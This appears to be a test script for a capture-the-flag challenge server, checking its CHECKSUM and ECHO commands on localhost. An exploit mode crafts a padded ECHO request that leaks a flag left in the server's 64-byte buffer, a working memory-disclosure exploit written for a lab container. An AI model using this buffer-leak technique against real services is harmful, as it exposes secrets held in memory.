import socket
import time
import random
import sys

debug_me=False

def connect(host, port):
    try:
        s_ = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s_.connect((host, port))
        return s_
    except:
        print("[test.py] Error: Connecting to host:", host, "port:", port)
        sys.exit(-1)


def send(c_, message):
    delim = "\n"
    if isinstance(message, (bytes,bytearray)):
        to_send = message + bytes(delim,'utf-8')
        c_.sendall(to_send)
    else:
        to_send = message + delim
        c_.sendall(to_send.encode())


def receive(c_,ignore_first_newline=False,flag_size=20):
    msg_char = ""
    message = ""
    ignore_count = flag_size+1 
    
    found_end = False
    start_count = False
    while not found_end:
        msg_char = c_.recv(1)
        msg_char = msg_char.decode("cp1252")
        message += msg_char
        if msg_char == '\n':
           if ignore_first_newline:
               start_count = True
           else:
               found_end = True
        if start_count:
           ignore_count -= 1
           if ignore_count<=0:
              found_end = True
    return message.rstrip()


def close(c_):
    c_.close()


def test(message, response, host, port, dont_suppress=True):
    expected_time = 10  # ms
    c = connect(host, port)

    expect = "Enter Command (CHECKSUM or ECHO:<message size>:<message>):"
    server_hello = receive(c)

    if server_hello != expect:
        print("[test.py] Error: Server Hello")
        sys.exit(-1)

    expect = response

    tic = time.time()
    if debug_me:
        print("[test.py] Client sending = '{}'".format(message))
    send(c, message)
    msg_in = receive(c)
    if debug_me:
        print("[test.py] Server Response = '{}'".format(msg_in))

    toc = time.time()

    if not expect in msg_in:
        print("[test.py] Error: Invalid Server Response")
        print("\tRequest:", message)
        print("\tResponse:", msg_in)
        print("\tExpected:", expect)
        close(c)
        sys.exit(-1)
    elif dont_suppress:
        print("[test.py] Valid Server Response")
        
    if (toc - tic) * 1000 > expected_time:
        print("[test.py] Error: Server took too long to respond")
        print("\tRequest:", message)
        print("\tResponse:", msg_in)
        print("\tActual Time:", (toc - tic) * 1000, "ms")
        print("\tExpected Time:", expected_time, "ms")
        close(c)
        sys.exit(-1)
    close(c)

    return msg_in

def exploit_test(message, response, host, port, check_flag_string):
    expected_time = 10  # ms
    c = connect(host, port)

    expect = "Enter Command (CHECKSUM or ECHO:<message size>:<message>):"
    server_hello = receive(c)

    if server_hello != expect:
        print("[test.py] Error: Server Hello")
        sys.exit(-1)

    expect = response

    tic = time.time()
    send(c, message)
    msg_in = receive(c,ignore_first_newline=True,flag_size=len(check_flag_string))
    toc = time.time()

    if debug_me:
        print("[test.py] Server Response = '{}'".format(msg_in))

    #if not expect in msg_in:
    #    print("[test.py] Error: Invalid Server Response")
    #    print("\tRequest:", message)
    #    print("\tResponse:", msg_in)
    #    print("\tExpected:", expect)
    #    close(c)
    #    sys.exit(-1)
    #else:
    #    print("[test.py] Valid Server Response")
        
    if check_flag_string in msg_in:
        print("[test.py] Successful Exploit")
        if debug_me:
            print("\tResponse:", msg_in)
            print("\tExpected Flag String:", check_flag_string)
        close(c)
        sys.exit(-1)
    else:
        print("[test.py] UNsuccessful Exploit : '{}'".format(msg_in))
        if debug_me:
            print("\tResponse:", msg_in)
            print("\tExpected Flag String:", check_flag_string)
        close(c)
        sys.exit(0)
        
    if (toc - tic) * 1000 > expected_time:
        print("[test.py] Error: Server took too long to respond")
        print("\tRequest:", message)
        print("\tResponse:", msg_in)
        print("\tActual Time:", (toc - tic) * 1000, "ms")
        print("\tExpected Time:", expected_time, "ms")
        close(c)
        sys.exit(-1)
    close(c)


def main():
    global debug_me
    enable_exploit = False
    enable_checksum = False
    enable_echo = False
    enable_invalid = False
    enable_stress = False
    test_type_offset=1
    flag_offset=2
    if len(sys.argv) < 3:
        print("Usage: python3.7 test.py [--exploit|--checksum|--echo|--invalid <#>] <flag (1-20 characters)> [--debug]")
        return
    if "exploit" in sys.argv[test_type_offset]:
        enable_exploit = True
    elif "checksum" in sys.argv[test_type_offset]:
        enable_checksum = True
    elif "echo" in sys.argv[test_type_offset]:
        enable_echo = True
    elif "stress" in sys.argv[test_type_offset]:
        enable_stress = True
    elif "invalid" in sys.argv[test_type_offset]:
        enable_invalid = True
        type_invalid = sys.argv[test_type_offset+1]
        flag_offset += 1
        if len(sys.argv) > 5:
            print("Incorrect command line input")
            print("Usage: python3.7 test.py [--exploit|--checksum|--echo|--invalid <#>] <flag (1-20 characters)> [--debug]")
            return
                  
    else:
        print("Usage: python3.7 test.py [--exploit|--checksum|--echo|--invalid <#>] <flag (1-20 characters)> [--debug]")
        return
    
    if len(sys.argv[flag_offset]) > 20:
        print("Flag provided is longer than 20 characters")
        print("Usage: python3.7 test.py [--exploit|--checksum|--echo|--invalid <#>] <flag (1-20 characters)> [--debug]")
        return

    flag_string = sys.argv[flag_offset]
    if sys.argv[len(sys.argv)-1] == "--debug":
        debug_me=True
        
    #host = "challenge_container"
    host = "localhost"
    port = 8082

    alphabet = "abcdefghijklmnopqrstuvwxyz01234ABCDEFGHIJKLMNOPQRSTUVWXYZ"

    # Assumed running from defaults specified in dockerfile

    if (not enable_exploit and not enable_checksum and not enable_echo\
        and not enable_invalid) or enable_stress:
        random.seed(9992)
        num_tests = 20
        for i in range(num_tests):
            rnd = random.random()
            if debug_me:
                print("[test.py] random value = {}".format(rnd))
            if rnd < 0.25:
                # Run Invalid Command
                if debug_me:
                    print("[test.py] Trial #:", i + 1, "of:",num_tests, "Test: Expected invalid command")
                size = round(34*random.random() + 1)
                test_str = "".join([random.choice(alphabet) for j in range(size-1)])
                response = "Invalid command"
                test(test_str, response, host, port)
            elif 0.25 <= rnd < 0.50:
                # Run CHECKSUM
                if debug_me:
                    print("[test.py] Trial #:", i + 1, "of:",num_tests, "Test: CHECKSUM")
                test_str = "CHECKSUM"
                response = "CHECKSUM="
                test(test_str, response, host, port)
				# make sure invalid command is always called after CHECKSUM
                #size = round(34*random.random() + 1)
                #test_str = "".join([random.choice(alphabet) for j in range(size-1)])
                #response = "Invalid command"
                #test(test_str, response, host, port)
            elif 0.50 <= rnd < 0.75:
                # Run ECHO:<message size>:<message> valid
                if debug_me:
                    print("[test.py] Trial #:", i + 1, "of:",num_tests, "Test: Expected valid ECHO")
                size = round(34*random.random() + 1)
                message = "".join([random.choice(alphabet) for j in range(size-1)])
                test_str = "ECHO:{}:{}".format(size, message)
                response = message  # Message echo'd back
                test(test_str, response, host, port)
            else:
                # Run ECHO invalid 4 cases
                if debug_me:
                    print("[test.py] Trial #:", i + 1, "of:",num_tests, "Test: Expected invalid ECHO")
                # 1: size < 1
                size = round(34*random.random() + 1)
                message = "".join([random.choice(alphabet) for j in range(size-1)])
                test_str = "ECHO:{}:{}".format("", message)
                response = "Message is too small!"
                test(test_str, response, host, port)
                # 2: len(message) < 1
                size = round(34*random.random() + 1)
                message = "".join([random.choice(alphabet) for j in range(size-1)])
                test_str = "ECHO:{}:{}".format(size, "")
                response = "Message is too small!"
                test(test_str, response, host, port)
                # 3: size > BUFFER_SIZE - offset
                size = round(34*random.random() + 1)
                message = "".join([random.choice(alphabet) for j in range(size-1)])
                test_str = "ECHO:{}:{}".format(1000, message)
                response = "Message is too large!"
                test(test_str, response, host, port)
        print("[test.py] All tests passed!")
    elif enable_checksum:
        # Run CHECKSUM
        test_str = "CHECKSUM"
        response = "CHECKSUM="
        test(test_str, response, host, port)
    elif enable_echo:
        # Run ECHO:<message size>:<message> valid
        size = round(34*random.random() + 1)
        message = "".join([random.choice(alphabet) for j in range(size-1)])
        test_str = "ECHO:{}:{}".format(size, message)
        if debug_me:
            print("[test.py] {}".format(test_str))
        response = message  # Message echo'd back
        test(test_str, response, host, port)
    elif enable_invalid:
        if type_invalid==0:
            # 1: size < 1
            size = round(34*random.random() + 1)
            message = "".join([random.choice(alphabet) for j in range(size-1)])
            test_str = "ECHO:{}:{}".format("", message)
            response = "Message is too small!"
            test(test_str, response, host, port)
        elif type_invalid==1:
            # 2: len(message) < 1
            size = round(34*random.random() + 1)
            message = "".join([random.choice(alphabet) for j in range(size-1)])
            test_str = "ECHO:{}:{}".format(size, "")
            response = "Message is too small!"
            test(test_str, response, host, port)
        elif type_invalid==2:
            # 3: size > BUFFER_SIZE - offset
            size = round(34*random.random() + 1)
            message = "".join([random.choice(alphabet) for j in range(size-1)])
            test_str = "ECHO:{}:{}".format(1000, message)
            response = "Message is too large!"
            test(test_str, response, host, port)
        else:
            # 4: Run Invalid Command
            size = round(34*random.random() + 1)
            test_str = "".join([random.choice(alphabet) for j in range(size-1)])
            response = "Invalid command"
            test(test_str, response, host, port)

    elif enable_exploit:
        print("[test.py] Attempting Exploit")
        BUFFER_SIZE=64
        # ---- CHECKSUM COMMAND ----
        # need to run CHECKSUM to get character gap 
        #      s.t. 
        #      [gap = BUFFER_SIZE - sizeof FLAG]
        #      gap can be 44 to 64 [FLAG <= 20 and BUFFER_SIZE=64] 
        #       => input_buffer result is '*'{gap}'FLAG'
        checksum_command = "CHECKSUM"
        response = "CHECKSUM="
        test(checksum_command, response, host, port,dont_suppress=False)


        # ----   ECHO COMMAND   ----
        # then need to run ECHO with input such that 
        #     'ECHO:pt1:pt2' => 
        #                  pt1 = such that 1 <= pt1 < 64
        #                  pt2 = intact FLAG from CHECKSUM run
        # 'ECHO:0{fill_size-1}1:<flag>'
        #  ----5
        #       -----59
        flag_size = len(flag_string)
        echo_delim = ':'
        echo_prefix = "ECHO"+echo_delim
        echo_size = 1
        #           buffer_size-len(flag)-len("ECHO:")-len(":")
        fill_size = BUFFER_SIZE-flag_size-len(echo_prefix)-len(echo_delim)-1
        echo_command = "{}{}{}".format(echo_prefix,str(echo_size).zfill(fill_size),echo_delim)
        echo_command_bytes = bytes(echo_command,'utf-8')
        response = flag_string  # Message echo'd back
        exploit_test(echo_command_bytes, response, host, port, flag_string)


if __name__ == "__main__":
    main()
